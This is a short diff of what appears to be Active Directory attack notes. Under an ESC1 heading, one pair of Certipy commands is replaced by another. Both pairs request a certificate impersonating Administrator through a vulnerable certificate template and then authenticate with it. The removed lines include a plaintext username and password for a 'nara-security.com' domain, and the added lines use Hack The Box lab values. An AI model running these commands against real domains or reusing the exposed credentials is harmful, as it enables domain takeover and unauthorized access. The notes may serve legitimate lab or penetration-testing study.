@@ -232,8 +232,8 @@ https://github.com/ly4k/Certipy?tab=readme-ov-file#certificates
 ```
 ESC1:
 
-certipy-ad req -username Tracy.White@nara-security.com -password zqwj041FGX -target-ip 192.168.168.30 -ca 'NARA-CA' -template 'NaraUser' -upn Administrator@NARA-SECURITY.COM
-certipy-ad auth -pfx administrator.pfx -username Administrator -domain 'nara-security.com' -dc-ip 192.168.168.30
+certipy req -username 'ryan.cooper@sequel.htb' -password 'NuclearMosquito3' -ca 'sequel-DC-CA' -target dc.sequel.htb -template 'UserAuthentication' -upn administrator@sequel.htb
+certipy auth -pfx administrator.pfx -username administrator -domain 'SEQUEL.HTB' -dc-ip 10.10.11.202
 ```
 #### Resource Based Constrained Delegation Attack
 ```
